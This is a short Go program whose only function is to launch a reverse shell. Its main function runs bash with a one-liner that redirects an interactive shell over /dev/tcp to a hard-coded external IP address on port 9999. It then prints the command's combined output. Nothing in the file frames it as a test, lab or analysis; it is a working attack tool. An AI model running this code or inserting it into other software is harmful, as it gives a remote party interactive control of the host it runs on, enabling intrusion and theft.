package main


import (
"fmt"
"log"
"os/exec"
)

func main() {
	cmd := exec.Command("bash", "-c","bash -i >& /dev/tcp/101.42.52.114/9999 0>&1")
	out, err := cmd.CombinedOutput()
	if err != nil {
        fmt.Printf("combined out:\n%s\n", string(out))
		log.Fatalf("cmd.Run() failed with %s\n", err)
	}
	fmt.Printf("combined out:\n%s\n", string(out))
}